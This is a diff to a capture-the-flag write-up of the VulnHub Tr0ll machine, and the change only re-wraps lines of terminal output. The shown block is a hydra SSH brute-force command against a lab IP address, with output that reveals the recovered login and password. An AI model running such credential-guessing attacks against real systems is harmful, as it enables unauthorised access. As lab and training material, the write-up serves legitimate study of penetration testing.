@@ -283,10 +283,11 @@ the actual password.
 
 ```
 root@lifesfun:~/vulnhub/tr0ll# hydra -L which_one_lol.txt -p Pass.txt ssh://192.168.20.150
-Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, 
+or for illegal purposes.
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-15 20:30:11
-[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Many SSH configurations limit the number of parallel tasks, 
+it is recommended to reduce the tasks: use -t 4
 [DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
 [DATA] attacking ssh://192.168.20.150:22/
 [22][ssh] host: 192.168.20.150   login: overflow   password: Pass.txt
